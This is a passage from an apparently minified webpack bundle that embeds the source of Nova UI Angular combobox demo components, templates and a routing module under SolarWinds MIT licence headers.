boolean = true;\n    public comboboxControl = new FormControl<IExampleItem | null>(null);\n    public comboboxControlSingle = new FormControl<string | null>(null);\n    public comboboxControlMulti = new FormControl<\n        { id: string; name: string }[] | null\n    >(null);\n    public fancyForm;\n    public closePopoverSubject: Subject<void> = new Subject<void>();\n    @ViewChild("comboboxSingle") public comboboxSingle: ComboboxV2Component;\n    @ViewChild("comboboxMultiDimensions")\n    public comboboxMultiDimensions: ComboboxV2Component;\n    private activeDialog: NuiDialogRef;\n    private destroy$: Subject<any> = new Subject<any>();\n    private scrollOffset: number = 0;\n    @ViewChild(CdkVirtualScrollViewport)\n    private viewport: CdkVirtualScrollViewport;\n    @ViewChild("virtual") private virtualCombobox: ComboboxV2Component;\n\n    constructor(\n        private formBuilder: FormBuilder,\n        private dialogService: DialogService,\n        private toastService: ToastService\n    ) {\n        this.fancyForm = this.formBuilder.group({\n            combobox: this.formBuilder.control("", Validators.required),\n        });\n    }\n\n    public closePopover(): void {\n        this.closePopoverSubject.next();\n    }\n\n    public createOption(option: string): void {\n        this.options.push(option);\n        this.comboboxControlSingle.setValue(option);\n    }\n\n    public createOptionMulti(optionName: string): void {\n        const option = {\n            id: `value-${this.options.length}`,\n            name: optionName,\n        };\n\n        this.optionsMulti.push(option);\n        this.comboboxControlMulti.setValue([\n            ...(this.comboboxControlMulti.value || []),\n            option,\n        ]);\n    }\n\n    public displayFn(item: IExampleItem): string {\n        return item?.name || "";\n    }\n\n    public convertToChip(value: IExampleItem): {\n        id: IExampleItem["id"];\n        label: IExampleItem["name"];\n    } {\n        return {\n            id: value.id,\n            label: value.name,\n        };\n    }\n\n    public isInErrorState(): boolean {\n        return !!this.selectedItem;\n    }\n\n    public isDisabled(option: string): boolean {\n        return !!(parseInt(option.slice(-1), 10) % 2);\n    }\n\n    public getOptions(\n        amount: number,\n        isDisabled?: boolean\n    ): { id: string; name: string; disabled: boolean }[] {\n        return Array.from({ length: amount }).map((_, i) => ({\n            id: `value-${i}`,\n            name: $localize`Item ${i}`,\n            disabled: isDisabled || i % 2 ? true : false,\n        }));\n    }\n\n    public showList(event: Event): void {\n        event.stopPropagation();\n        this.comboboxMultiDimensions.showDropdown();\n        this.comboboxMultiDimensions.inputElement.nativeElement.focus();\n    }\n\n    public hideList(event: Event): void {\n        event.stopPropagation();\n        this.comboboxMultiDimensions.hideDropdown();\n    }\n\n    public toggleList(event: Event): void {\n        event.stopPropagation();\n        this.comboboxMultiDimensions.toggleDropdown();\n        this.comboboxMultiDimensions.inputElement.nativeElement.focus();\n    }\n\n    public ngOnInit(): void {\n        this.comboboxControl.valueChanges\n            .pipe(takeUntil(this.destroy$))\n            .subscribe((value) => {\n                this.selectedItem = value;\n            });\n        this.comboboxControlSingle.valueChanges\n            .pipe(takeUntil(this.destroy$))\n            .subscribe((value) => {\n                this.selectedSingleItem = value;\n            });\n    }\n\n    public ngAfterViewInit(): void {\n        this.virtualCombobox.valueSelected\n            .pipe(takeUntil(this.destroy$))\n            .subscribe(() => {\n                this.scrollOffset = this.viewport.measureScrollOffset();\n            });\n\n        this.virtualCombobox.valueChanged\n            .pipe(\n                filter((v) => v !== undefined),\n                // eslint-disable-next-line import/no-deprecated\n                tap(\n                    (v) =>\n                        (this.filteredItems = of(this.filterItems(v as string)))\n                ),\n                delay(0),\n                // eslint-disable-next-line import/no-deprecated\n                tap(this.calculateContainerHeight),\n                takeUntil(this.destroy$)\n            )\n            .subscribe();\n    }\n\n    public open(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, { size: "sm" });\n    }\n\n    public confirm(event: MouseEvent): void {\n        event?.stopPropagation();\n        this.activeDialog = this.dialogService.confirm({\n            message: "IS THIS SPARTA?",\n            useOverlay: true,\n        });\n    }\n\n    public openInOverlay(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, {\n            size: "lg",\n            useOverlay: true,\n        });\n    }\n\n    public actionDone(): void {\n        this.toastService.success({\n            message: $localize`Action Done!`,\n            title: $localize`Event`,\n        });\n        this.activeDialog.close();\n    }\n\n    public actionCanceled(): void {\n        this.toastService.info({\n            message: $localize`Action Cancelled!`,\n            title: $localize`Event`,\n        });\n        this.activeDialog.close();\n    }\n\n    public onButtonClick(title: string): void {\n        title === "Action" ? this.actionDone() : this.actionCanceled();\n        this.activeDialog.close();\n    }\n\n    private getRandomIcon() {\n        return this.icons[Math.round(Math.random() * 2)];\n    }\n\n    private filterItems(value: string): string[] {\n        if (!value) {\n            return this.virtualItems;\n        }\n        const filterValue = value?.toLowerCase();\n\n        return this.virtualItems.filter((option) =>\n            option.toLowerCase().includes(filterValue)\n        );\n    }\n\n    private calculateContainerHeight = (): void => {\n        if (\n            this.virtualCombobox.inputValue &&\n            this.viewport.measureRenderedContentSize() < defaultContainerHeight\n        ) {\n            this.containerHeight = this.viewport.measureRenderedContentSize();\n            return;\n        }\n        this.containerHeight = defaultContainerHeight;\n    };\n}\n'},7385:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="comboboxControl"\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">\n        <span [nuiComboboxV2OptionHighlight]="item"></span>\n    </nui-select-v2-option>\n</nui-combobox-v2>\n'},77973:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl } from "@angular/forms";\n\n@Component({\n    selector: "nui-combobox-v2-typeahead-example",\n    templateUrl: "combobox-v2-typeahead.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2TypeaheadExampleComponent {\n    public items = Array.from({ length: 50 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public comboboxControl = new FormControl();\n}\n'},63363:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="comboboxControl"\n    [isTypeaheadEnabled]="false"\n    #combobox\n>\n    <cdk-virtual-scroll-viewport\n        itemSize="30"\n        [minBufferPx]="300"\n        [maxBufferPx]="600"\n        [style.height.px]="containerHeight"\n    >\n        <div *cdkVirtualFor="let item of filteredItems | async; index as i">\n            <nui-select-v2-option\n                [value]="item"\n                class="d-flex align-items-center"\n            >\n                <span [nuiComboboxV2OptionHighlight]="item"></span>\n            </nui-select-v2-option>\n        </div>\n    </cdk-virtual-scroll-viewport>\n</nui-combobox-v2>\n'},19579:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { CdkVirtualScrollViewport } from "@angular/cdk/scrolling";\nimport {\n    AfterViewInit,\n    Component,\n    HostListener,\n    OnDestroy,\n    ViewChild,\n} from "@angular/core";\nimport { FormControl } from "@angular/forms";\nimport { Observable, of, Subject } from "rxjs";\n// eslint-disable-next-line import/no-deprecated\nimport { delay, filter, takeUntil, tap } from "rxjs/operators";\n\nimport { ComboboxV2Component } from "@nova-ui/bits";\n\nconst defaultContainerHeight: number = 300;\n\n@Component({\n    selector: "nui-combobox-v2-virtual-scroll-example",\n    templateUrl: "combobox-v2-virtual-scroll.example.component.html",\n    host: { class: "combobox-container" },\n})\nexport class ComboboxV2VirtualScrollExampleComponent\n    implements OnDestroy, AfterViewInit\n{\n    public items = Array.from({ length: 100000 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public comboboxControl = new FormControl("");\n    public filteredItems: Observable<any[]> = of([...this.items]);\n    public containerHeight: number = defaultContainerHeight;\n\n    private readonly destroy$ = new Subject<void>();\n    private scrollOffset: number = 0;\n\n    @ViewChild(CdkVirtualScrollViewport)\n    private viewport: CdkVirtualScrollViewport;\n    @ViewChild(ComboboxV2Component) private combobox: ComboboxV2Component;\n\n    @HostListener("click")\n    public handleClick(): void {\n        if (this.viewport) {\n            this.viewport.scrollToOffset(this.scrollOffset);\n        }\n    }\n\n    public ngAfterViewInit(): void {\n        this.combobox.valueSelected\n            .pipe(takeUntil(this.destroy$))\n            .subscribe(() => {\n                this.scrollOffset = this.viewport.measureScrollOffset();\n            });\n\n        this.combobox.valueChanged\n            .pipe(\n                filter((v) => v !== undefined),\n                // eslint-disable-next-line import/no-deprecated\n                tap(\n                    (v) =>\n                        (this.filteredItems = of(this.filterItems(v as string)))\n                ),\n                delay(0),\n                // eslint-disable-next-line import/no-deprecated\n                tap(this.calculateContainerHeight),\n                takeUntil(this.destroy$)\n            )\n            .subscribe();\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n\n    private filterItems(value: string): string[] {\n        if (!value) {\n            return this.items;\n        }\n        const filterValue = value?.toLowerCase();\n\n        return this.items.filter((option) =>\n            option.toLowerCase().includes(filterValue)\n        );\n    }\n\n    private calculateContainerHeight = (): void => {\n        if (\n            this.combobox.inputValue &&\n            this.viewport.measureRenderedContentSize() < defaultContainerHeight\n        ) {\n            this.containerHeight = this.viewport.measureRenderedContentSize();\n            return;\n        }\n        this.containerHeight = defaultContainerHeight;\n    };\n}\n'},63679:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ScrollingModule } from "@angular/cdk/scrolling";\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiChipsModule,\n    NuiDialogModule,\n    NuiDividerModule,\n    NuiDocsModule,\n    NuiFormFieldModule,\n    NuiIconModule,\n    NuiMenuModule,\n    NuiMessageModule,\n    NuiOverlayAdditionsModule,\n    NuiOverlayModule,\n    NuiPopoverModule,\n    NuiSelectModule,\n    NuiSelectV2Module,\n    NuiSwitchModule,\n    NuiValidationMessageModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    ComboboxV2BasicExampleComponent,\n    ComboboxV2CreateOptionExampleComponent,\n    ComboboxV2CreateOptionMultiselectExampleComponent,\n    ComboboxV2CustomControlExampleComponent,\n    ComboboxV2CustomizeOptionsExampleComponent,\n    ComboboxV2CustomTypeaheadExampleComponent,\n    ComboboxV2DisabledExampleComponent,\n    ComboboxV2DocsComponent,\n    ComboboxV2ErrorExampleComponent,\n    ComboboxV2GettingValueExampleComponent,\n    ComboboxV2GroupedOptionsExampleComponent,\n    ComboboxV2InlineExampleComponent,\n    ComboboxV2MultiselectExampleComponent,\n    ComboboxV2OpitionsChangedExampleComponent,\n    ComboboxV2OverlayConfigExampleComponent,\n    ComboboxV2ReactiveFormFieldExampleComponent,\n    ComboboxV2RemoveValueExampleComponent,\n    ComboboxV2SettingValueExampleComponent,\n    ComboboxV2StylingExampleComponent,\n    ComboboxV2TestExampleComponent,\n    ComboboxV2TypeaheadExampleComponent,\n    ComboboxV2VirtualScrollExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: ComboboxV2DocsComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "basic",\n        component: ComboboxV2BasicExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "getting-value",\n        component: ComboboxV2GettingValueExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "setting-value",\n        component: ComboboxV2SettingValueExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "customize-options",\n        component: ComboboxV2CustomizeOptionsExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "typeahead",\n        component: ComboboxV2TypeaheadExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "grouped",\n        component: ComboboxV2GroupedOptionsExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "remove-value",\n        component: ComboboxV2RemoveValueExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "multiselect",\n        component: ComboboxV2MultiselectExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "virtual-scroll",\n        component: ComboboxV2VirtualScrollExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "overlay-config",\n        component: ComboboxV2OverlayConfigExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "disabled",\n        component: ComboboxV2DisabledExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "error",\n        component: ComboboxV2ErrorExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "inline",\n        component: ComboboxV2InlineExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "styling",\n        component: ComboboxV2StylingExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "custom-typeahead",\n        component: ComboboxV2CustomTypeaheadExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "reactive-form-field",\n        component: ComboboxV2ReactiveFormFieldExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "create-option",\n        component: ComboboxV2CreateOptionExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "create-option-multiselect",\n        component: ComboboxV2CreateOptionMultiselectExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "custom-control",\n        component: ComboboxV2CustomControlExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "options-changed",\n        component: ComboboxV2OpitionsChangedExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n    {\n        path: "test",\n        component: ComboboxV2TestExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n/** @ignore */\n@NgModule({\n    imports: [\n        NuiIconModule,\n        NuiChipsModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiDividerModule,\n        NuiValidationMessageModule,\n        NuiFormFieldModule,\n        NuiMenuModule,\n        NuiPopoverModule,\n        NuiSwitchModule,\n        NuiSelectModule,\n        NuiSelectV2Module,\n        NuiMessageModule,\n        NuiButtonModule,\n        NuiDocsModule,\n        NuiOverlayModule,\n        NuiDialogModule,\n        ScrollingModule,\n        NuiOverlayAdditionsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        ComboboxV2BasicExampleComponent,\n        ComboboxV2DocsComponent,\n        ComboboxV2GroupedOptionsExampleComponent,\n        ComboboxV2RemoveValueExampleComponent,\n        ComboboxV2VirtualScrollExampleComponent,\n        ComboboxV2OverlayConfigExampleComponent,\n        ComboboxV2DisabledExampleComponent,\n        ComboboxV2ErrorExampleComponent,\n        ComboboxV2InlineExampleComponent,\n        ComboboxV2StylingExampleComponent,\n        ComboboxV2MultiselectExampleComponent,\n        ComboboxV2CustomTypeaheadExampleComponent,\n        ComboboxV2ReactiveFormFieldExampleComponent,\n        ComboboxV2CreateOptionExampleComponent,\n        ComboboxV2CreateOptionMultiselectExampleComponent,\n        ComboboxV2CustomizeOptionsExampleComponent,\n        ComboboxV2CustomControlExampleComponent,\n        ComboboxV2TestExampleComponent,\n        ComboboxV2OpitionsChangedExampleComponent,\n        ComboboxV2TypeaheadExampleComponent,\n        ComboboxV2GettingValueExampleComponent,\n        ComboboxV2SettingValueExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("combobox-v2"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ComboboxV2Module {}\n'},60135:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./combobox-v2-docs/combobox-v2-docs.example.component";\nexport * from "./combobox-v2-basic/combobox-v2-basic.example.component";\nexport * from "./combobox-v2-grouped-options/combobox-v2-grouped-options.example.component";\nexport * from "./combobox-v2-virtual-scroll/combobox-v2-virtual-scroll.example.component";\nexport * from "./combobox-v2-remove-value/combobox-v2-remove-value.example.component";\nexport * from "./combobox-v2-disabled/combobox-v2-disabled.example.component";\nexport * from "./combobox-v2-error/combobox-v2-error.example.component";\nexport * from "./combobox-v2-inline/combobox-v2-inline.example.component";\nexport * from "./combobox-v2-styling/combobox-v2-styling.example.component";\nexport * from "./combobox-v2-overlay-config/combobox-v2-overlay-config.example.component";\nexport * from "./combobox-v2-multiselect/combobox-v2-multiselect.example.component";\nexport * from "./combobox-v2-custom-typeahead/combobox-v2-custom-typeahead.example.component";\nexport * from "./combobox-v2-reactive-form-field/combobox-v2-reactive-form-field.example.component";\nexport * from "./combobox-v2-create-option/combobox-v2-create-option.example.component";\nexport * from "./combobox-v2-create-option-multiselect/combobox-v2-create-option-multiselect.example.component";\nexport * from "./combobox-v2-customize-options/combobox-v2-customize-options.example.component";\nexport * from "./combobox-v2-custom-control/combobox-v2-custom-control.example.component";\nexport * from "./combobox-v2-test/combobox-v2-test.example.component";\nexport * from "./combobox-v2-options-changed/combobox-v2-options-changed.example.component";\nexport * from "./combobox-v2-typeahead/combobox-v2-typeahead.example.component";\nexport * from "./combobox-v2-getting-value/combobox-v2-getting-value.example.component";\nexport * from "./combobox-v2-setting-value/combobox-v2-setting-value.example.component";\n'},54702:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox\n    [itemsSource]="dataset.items"\n    [appendToBody]="true"\n    placeholder="Select item"\n    i18n-placeholder\n>\n</nui-combobox>\n'},80554:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-combobox-append-to-body-example",\n    templateUrl: "./combobox-append-to-body.example.component.html",\n})\nexport class ComboboxAppendToBodyExampleComponent {\n    public dataset = {\n        items: [\n            "Item 1",\n            "Item 2",\n            "Item 3",\n            "Item 4",\n            "Item 5",\n            "Item 6",\n            "Item 7",\n            "Item 8",\n            "Item 9",\n            "Item 10",\n            "Item 11",\n            "Item 12",\n            "Item 13",\n            "Item 14",\n            "Item 15",\n        ],\n    };\n}\n'},8332:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox\n    [itemsSource]="dataset.items"\n    placeholder="Select item"\n    i18n-placeholder\n></nui-combobox>\n'},58172:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-combobox-basic-example",\n    templateUrl: "./combobox-basic.example.component.html",\n})\nexport class ComboboxBasicExampleComponent {\n    public dataset = {\n        items: [\n            "Item 1",\n            "Item 2",\n            "Item 3",\n            "Item 4",\n            "Item 5",\n            "Item 6",\n            "Item 7",\n            "Item 8",\n            "Item 9",\n            "Item 10",\n            "Item 11",\n            "Item 12",\n            "Item 13",\n            "Item 14",\n            "Item 15",\n        ],\n    };\n}\n'},17410:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox\n    [itemsSource]="dataset.items"\n    [clearOnBlur]="true"\n    placeholder="Select Item"\n    i18n-placeholder\n></nui-combobox>\n'},21758:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-combobox-clear-example",\n    templateUrl: "./combobox-clear.example.component.html",\n})\nexport class ComboboxClearExampleComponent {\n    public dataset = {\n        items: ["Item 1", "Item 2", "Item 3", "Item 4", "Item 5"],\n    };\n}\n'},25712:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #customComboboxTemplate let-item="context">\n    <nui-icon [icon]="item.icon"></nui-icon>\n    <div class="media-body" class="combobox-examples-custom-template">\n        <h2>{{ item.value }}</h2>\n        <h5>{{ item.name }}</h5>\n        <nui-progress\n            [showProgress]="true"\n            [show]="true"\n            [percent]="item.progress"\n        ></nui-progress>\n    </div>\n</ng-template>\n<nui-combobox\n    [value]="dataset.selectedItem"\n    [itemsSource]="displayedItems"\n    (changed)="textboxChanged($event)"\n    [displayValue]="dataset.displayValue"\n    [customTemplate]="customComboboxTemplate"\n    placeholder="Select item"\n    i18n-placeholder\n></nui-combobox>\n'},55528:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".combobox-examples {\n    &-custom-template {\n        min-width: 300px;\n    }\n}\n"},54416:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights 